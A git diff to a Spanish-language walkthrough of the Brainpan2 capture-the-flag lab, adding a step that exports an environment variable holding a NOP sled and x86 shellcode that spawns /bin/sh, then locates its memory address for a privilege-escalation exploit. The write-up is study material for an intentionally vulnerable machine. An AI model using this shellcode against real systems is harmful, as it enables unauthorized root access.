@@ -208,16 +208,28 @@ int main(void)
   return 0;
 }
 ```
-> Debido a que no existe el compilador GCC en el computador BRAINPAN2, lo vamos a compilar en nuestro KALI.
+> Debido a que no existe el compilador GCC en el computador BRAINPAN2, lo vamos a compilar en nuestro KALI y luego lo enviamos a BRAINPAN2.
 
 <img src="https://github.com/El-Palomo/BrainPan2/blob/main/Brain10.jpg" width="80%"></img>
+<img src="https://github.com/El-Palomo/BrainPan2/blob/main/Brain11.jpg" width="80%"></img>
 
 
+> Configuramos la variable de entorno con los NOPS y SHELLCODE. Luego obtener la dirección en memoria del mismo.
 
+```
+anansi@brainpan2:/tmp$ export EGG=`perl -e 'print "\x90"x64000 . "\x6a\x31\x58\x99\xcd\x80\x89\xc3\x89\xc1\x6a\x46\x58\xcd\x80\xb0\x0b\x52\x68\x6e\x2f\x73\x68\x68\x2f\x2f\x62\x69\x89\xe3\x89\xd1\xcd\x80"'`
+<x0b\x52\x68\x6e\x2f\x73\x68\x68\x2f\x2f\x62\x69\x89\xe3\x89\xd1\xcd\x80"'`  
+anansi@brainpan2:/tmp$ chmod +x ./getenv
+chmod +x ./getenv
+anansi@brainpan2:/tmp$ ./getenv
+./getenv
+EGG => 0xbfff055c
+```
 
+> Ejecutamos el EXPLOIT
+```
 
-
-
+```
 
 
 
